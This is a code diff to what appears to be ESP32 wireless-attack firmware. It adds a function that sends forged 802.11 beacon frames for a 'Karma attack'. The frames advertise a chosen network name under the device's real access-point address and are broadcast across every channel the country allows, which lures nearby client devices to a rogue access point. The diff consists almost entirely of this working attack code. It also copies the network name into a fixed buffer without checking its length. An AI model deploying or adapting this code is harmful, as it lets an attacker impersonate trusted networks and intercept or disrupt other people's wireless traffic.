@@ -20,6 +20,7 @@
 #include "managers/status_display_manager.h"
 #include "managers/settings_manager.h"
 #include "managers/views/terminal_screen.h"
+#include "scans/wifi/wifi_channels.h"
 #include "core/glog.h"
 #include "esp_wifi.h"
 #include "esp_random.h"
@@ -196,6 +197,112 @@ esp_err_t beacon_spam_broadcast(const char *ssid) {
         vTaskDelay(pdMS_TO_TICKS(10));
         if (ap_sta_has_ip) break; // only one transmit when a client has IP
     }
+
+    return ESP_OK;
+}
+
+// Broadcast a beacon frame for Karma attack (uses real AP MAC, hops channels)
+esp_err_t beacon_spam_broadcast_karma(const char *ssid) {
+    if (ssid == NULL) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    uint8_t packet[256] = {
+        0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source address (set to AP MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (set to AP MAC)
+        0xc0, 0x6c,                                     // Seq-ctl
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+        0x64, 0x00,                                     // Beacon interval (100 TU)
+        0x11, 0x04,                                     // Capability info (ESS)
+    };
+
+    // Get the real AP MAC address
+    uint8_t ap_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    memcpy(&packet[10], ap_mac, 6);  // Source
+    memcpy(&packet[16], ap_mac, 6);  // BSSID
+
+    // Get current channel for DS parameter set
+    uint8_t primary_channel;
+    wifi_second_chan_t second_channel;
+    esp_wifi_get_channel(&primary_channel, &second_channel);
+
+    uint8_t ssid_len = strlen(ssid);
+    packet[37] = ssid_len;
+    memcpy(&packet[38], ssid, ssid_len);
+
+    uint8_t *supported_rates_ie = &packet[38 + ssid_len];
+    supported_rates_ie[0] = 0x01; // Supported Rates IE tag
+    supported_rates_ie[1] = 0x08; // Length (8 rates)
+    supported_rates_ie[2] = 0x82; // 1 Mbps
+    supported_rates_ie[3] = 0x84; // 2 Mbps
+    supported_rates_ie[4] = 0x8B; // 5.5 Mbps
+    supported_rates_ie[5] = 0x96; // 11 Mbps
+    supported_rates_ie[6] = 0x24; // 18 Mbps
+    supported_rates_ie[7] = 0x30; // 24 Mbps
+    supported_rates_ie[8] = 0x48; // 36 Mbps
+    supported_rates_ie[9] = 0x6C; // 54 Mbps
+
+    uint8_t *ds_param_set_ie = &supported_rates_ie[10];
+    ds_param_set_ie[0] = 0x03; // DS Parameter Set IE tag
+    ds_param_set_ie[1] = 0x01; // Length (1 byte)
+    ds_param_set_ie[2] = primary_channel; // Current channel
+
+    // Add HE Capabilities (for Wi-Fi 6 detection)
+    uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
+    he_capabilities_ie[0] = 0xFF; // Vendor-Specific IE tag
+    he_capabilities_ie[1] = 0x0D; // Length of HE Capabilities
+    he_capabilities_ie[2] = 0x50; // Wi-Fi Alliance OUI byte 1
+    he_capabilities_ie[3] = 0x6f; // OUI byte 2
+    he_capabilities_ie[4] = 0x9A; // OUI byte 3
+    he_capabilities_ie[5] = 0x00;  // HE MAC capabilities
+    he_capabilities_ie[6] = 0x08;  // HE PHY capabilities
+    he_capabilities_ie[7] = 0x00;
+    he_capabilities_ie[8] = 0x00;
+    he_capabilities_ie[9] = 0x40;  // Spatial streams
+    he_capabilities_ie[10] = 0x00;
+    he_capabilities_ie[11] = 0x00;
+    he_capabilities_ie[12] = 0x01; // Wi-Fi 6 capabilities
+
+    size_t packet_size = (38 + ssid_len + 12 + 3 + 13);
+
+    // If AP has connected client, only send on current channel
+    if (ap_sta_has_ip) {
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+        return err;
+    }
+
+    // Build country-appropriate channel list
+    uint8_t channels[WIFI_CHANNELS_MAX];
+    uint8_t channel_count = wifi_channels_build_country_list(channels, sizeof(channels));
+
+    // Hop through all country-appropriate channels
+    for (int i = 0; i < channel_count; i++) {
+        uint8_t ch = channels[i];
+        if (!wifi_manager_karma_is_running()) {
+            return ESP_OK;
+        }
+
+        // Set appropriate secondary channel for 5GHz HT40
+        wifi_second_chan_t sec_chan = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+        if (ch > 14) {
+            sec_chan = WIFI_SECOND_CHAN_ABOVE;
+        }
+#endif
+        esp_wifi_set_channel(ch, sec_chan);
+
+        // Update DS parameter set with current channel
+        ds_param_set_ie[2] = ch;
+
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+
+    // Switch back to AP's operating channel
+    esp_wifi_set_channel(primary_channel, second_channel);
 
     return ESP_OK;
 }
